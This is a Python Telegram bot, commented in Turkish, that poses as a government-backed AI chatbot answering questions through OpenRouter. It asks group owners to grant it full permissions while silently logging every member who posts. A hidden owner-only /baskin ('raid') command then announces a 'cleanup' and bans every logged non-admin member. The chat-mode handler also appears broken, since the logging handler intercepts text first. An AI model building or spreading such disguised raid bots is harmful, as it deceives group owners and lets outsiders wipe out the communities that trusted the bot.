import os
import logging
import asyncio
import requests
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    ApplicationBuilder, CommandHandler, ContextTypes,
    MessageHandler, filters
)

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
OPENROUTER_API_KEY = os.getenv("OPENROUTER_API_KEY")

logging.basicConfig(level=logging.INFO)

BOT_SAHIPLERI = {123456789, 987654321}  # Buraya kendi Telegram ID'lerini yaz

aktif_uyeler = set()
sohbet_modu = False

async def openrouter_soru_cevapla(soru: str) -> str:
    if not OPENROUTER_API_KEY:
        return "OpenRouter API anahtarı bulunamadı."

    url = "https://openrouter.ai/api/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json"
    }
    payload = {
        "model": "gpt-4o-mini",
        "messages": [
            {"role": "user", "content": soru}
        ]
    }

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        response.raise_for_status()
        data = response.json()
        cevap = data["choices"][0]["message"]["content"]
        return cevap
    except Exception as e:
        logging.error(f"OpenRouter API hatası: {e}")
        return "Üzgünüm, şu anda cevap veremiyorum."

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    gif_url = "https://media.giphy.com/media/Gf3AUz3eBNbTW/giphy.gif"
    await update.message.reply_animation(animation=gif_url)
    text = (
        "Ben Türkiye Cumhuriyeti API Destekli Yapay Zeka Botuyum 🇹🇷\n"
        "`/sor` komutuyla soru sorabilir veya `/gel` ile sohbet edebilirsin.\n"
        "_Sunucularım periyodik olarak temizlenmektedir._"
    )
    buttons = [
        [InlineKeyboardButton("📌 DESTEK", url="https://t.me/kizilsancaktr")],
        [InlineKeyboardButton("👨‍💻 GELİŞTİRİCİ", url="https://t.me/ZeydBinhalit")]
    ]
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(buttons))

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    gif_url = "https://media.giphy.com/media/l3q2K5jinAlChoCLS/giphy.gif"
    await update.message.reply_animation(animation=gif_url)
    text = (
        "Eğer grubunuzda çalışmıyorsam, tek sebebi bazı yetkilerimin verilmemiş olmasıdır.\n"
        "🔧 Lütfen botun tüm yetkilere sahip olduğundan emin olun."
    )
    buttons = [
        [InlineKeyboardButton("📌 DESTEK", url="https://t.me/kizilsancaktr")],
        [InlineKeyboardButton("👨‍💻 GELİŞTİRİCİ", url="https://t.me/ZeydBinhalit")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(buttons))

async def mesaj_kaydet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message and update.message.from_user:
        aktif_uyeler.add(update.message.from_user.id)

async def baskin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    chat = update.effective_chat

    if user_id not in BOT_SAHIPLERI:
        return

    if chat.type not in ['group', 'supergroup']:
        await update.message.reply_text("Bu komut sadece grup sohbetlerinde kullanılabilir.")
        return

    mesajlar = [
        "Baskın başlıyor! 🔥🔥🔥",
        "Herkese dikkat! Sıkı durun! 💥",
        "Yönetici ve botlar dışındakiler hazırlanıyor... 🚨",
        "Çılgın baskın mod aktif! 🚀",
        "Son uyarı! Bu grupta artık temizlik zamanı! 🧹",
    ]

    for msg in mesajlar:
        await update.message.reply_text(msg)
        await asyncio.sleep(1.5)

    gif_url = "https://media.giphy.com/media/3o7btPCcdNniyf0ArS/giphy.gif"
    await update.message.reply_animation(animation=gif_url)

    await asyncio.sleep(2)

    try:
        admins = await context.bot.get_chat_administrators(chat.id)
        admin_ids = {admin.user.id for admin in admins}
        admin_ids.add(context.bot.id)

        ban_say = 0
        for uid in list(aktif_uyeler):
            if uid not in admin_ids:
                try:
                    await context.bot.ban_chat_member(chat.id, uid)
                    aktif_uyeler.remove(uid)
                    ban_say += 1
                    await update.message.reply_text(f"🚫 Kullanıcı banlandı: {uid}")
                    await asyncio.sleep(0.5)
                except Exception as e:
                    logging.error(f"Banlama hatası: {e}")

        await update.message.reply_text(f"Baskın tamamlandı! {ban_say} kullanıcı banlandı.")
    except Exception as e:
        await update.message.reply_text(f"Hata oluştu: {e}")

async def gel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global sohbet_modu
    user_id = update.message.from_user.id

    if user_id not in BOT_SAHIPLERI:
        return

    sohbet_modu = True
    await update.message.reply_text("Sohbet modu açıldı. Artık sohbetlere yanıt vereceğim.")

async def sor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Lütfen bir soru yaz. Örnek: /sor Dünya neden yuvarlaktır?")
        return

    soru = " ".join(context.args)

    cevap = await openrouter_soru_cevapla(soru)
    await update.message.reply_text(f"Soru: {soru}\nCevap: {cevap}")

async def sohbet_mesaj(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global sohbet_modu
    if not sohbet_modu:
        return

    mesaj = update.message.text
    if not mesaj:
        return

    cevap = await openrouter_soru_cevapla(mesaj)
    await update.message.reply_text(cevap)

def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("baskin", baskin))
    app.add_handler(CommandHandler("gel", gel))
    app.add_handler(CommandHandler("sor", sor))

    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, mesaj_kaydet))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, sohbet_mesaj))

    print("Bot başladı.")
    app.run_polling()

if __name__ == "__main__":
    main()
